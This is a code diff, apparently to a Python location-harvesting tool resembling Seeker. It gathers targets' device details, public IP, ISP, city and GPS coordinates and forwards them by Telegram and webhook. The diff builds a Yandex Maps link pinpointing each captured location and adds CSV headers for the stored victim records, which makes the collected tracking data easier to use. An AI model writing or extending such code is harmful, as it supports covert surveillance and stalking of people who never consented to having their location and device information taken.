@@ -54,17 +54,19 @@ print_v = args.version
 telegram = getenv('TELEGRAM') or args.telegram
 webhook = getenv('WEBHOOK') or args.webhook
 
+debug_http = getenv('DEBUG_HTTP')
 if (
-    getenv('DEBUG_HTTP')
-    and (getenv('DEBUG_HTTP') == '1' or getenv('DEBUG_HTTP').lower() == 'true')
+    debug_http
+    and (debug_http == '1' or debug_http.lower() == 'true')
 ) or args.debugHTTP is True:
     environ['DEBUG_HTTP'] = '1'
 else:
     environ['DEBUG_HTTP'] = '0'
 
+template_env = getenv('TEMPLATE')
 templateNum = (
-    int(getenv('TEMPLATE'))
-    if getenv('TEMPLATE') and getenv('TEMPLATE').isnumeric()
+    int(template_env)
+    if template_env and template_env.isnumeric()
     else args.template
 )
 
@@ -445,7 +447,10 @@ def data_parser():
                 var_dir = result_json['dir']
                 var_spd = result_json['spd']
 
-                data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])
+                # Генерируем ссылку на Яндекс.Карты
+                yandex_maps_link = f'https://yandex.ru/maps/?ll={var_lon.strip(" deg")},{var_lat.strip(" deg")}&z=17&l=map&pt={var_lon.strip(" deg")},{var_lat.strip(" deg")},pm2rdm'
+                
+                data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd, yandex_maps_link])
                 loc_info = f"""{Y}[!] Location Information :{W}
 
 {G}[+] {C}Latitude  : {W}{var_lat}
@@ -458,9 +463,9 @@ def data_parser():
                 utils.print(loc_info)
                 send_telegram(result_json, 'location')
                 send_webhook(result_json, 'location')
-                yandex_maps_url = f'{G}[+] {C}Yandex Maps : {W}https://yandex.ru/maps/?ll={var_lon.strip(" deg")},{var_lat.strip(" deg")}&z=17&l=map&pt={var_lon.strip(" deg")},{var_lat.strip(" deg")},pm2rdm'
+                yandex_maps_url = f'{G}[+] {C}Yandex Maps : {W}{yandex_maps_link}'
                 yandex_maps_json = {
-                    'url': f'https://yandex.ru/maps/?ll={var_lon.strip(" deg")},{var_lat.strip(" deg")}&z=17&l=map&pt={var_lon.strip(" deg")},{var_lat.strip(" deg")},pm2rdm'
+                    'url': yandex_maps_link
                 }
                 utils.print(yandex_maps_url)
                 send_telegram(yandex_maps_json, 'url')
@@ -494,6 +499,18 @@ def kmlout(var_lat, var_lon):
 
 
 def csvout(row):
+    # Проверяем, существует ли файл и пуст ли он (добавляем заголовки)
+    if not path.exists(DATA_FILE) or path.getsize(DATA_FILE) == 0:
+        headers = [
+            'OS', 'Platform', 'CPU_Cores', 'RAM', 'GPU_Vendor', 'GPU', 
+            'Resolution', 'Browser', 'Public_IP', 'Continent', 'Country', 
+            'Region', 'City', 'Organization', 'ISP', 'Latitude', 'Longitude', 
+            'Accuracy', 'Altitude', 'Direction', 'Speed', 'Yandex_Maps_URL'
+        ]
+        with open(DATA_FILE, 'w') as csvfile:
+            csvwriter = writer(csvfile)
+            csvwriter.writerow(headers)
+    
     with open(DATA_FILE, 'a') as csvfile:
         csvwriter = writer(csvfile)
         csvwriter.writerow(row)
